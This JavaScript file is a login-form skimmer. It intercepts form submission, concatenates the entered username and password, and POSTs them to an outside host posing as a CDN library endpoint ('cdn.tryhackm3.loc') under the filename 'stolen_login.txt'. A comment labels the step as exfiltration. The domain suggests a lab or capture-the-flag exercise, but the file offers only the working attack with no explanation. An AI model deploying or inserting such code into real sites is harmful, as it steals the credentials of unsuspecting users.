
document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('login-form');
    form.addEventListener('submit', function(event) {
        event.preventDefault(); // Prevent the default form submission

        const formDataObj = {
            username: document.getElementById('username').value,
            password: document.getElementById('password').value
        };

        let formattedData = "login details are: username: " + formDataObj["username"] + " password: " + formDataObj["password"];

        // Exfiltrate formatted credentials
        fetch('https://cdn.tryhackm3.loc/ui/libraries?upload&filename=stolen_login.txt', {
            method: 'POST',
            headers: {
                'Content-Type': 'text/plain'
            },
            body: formattedData
        });
    });
});
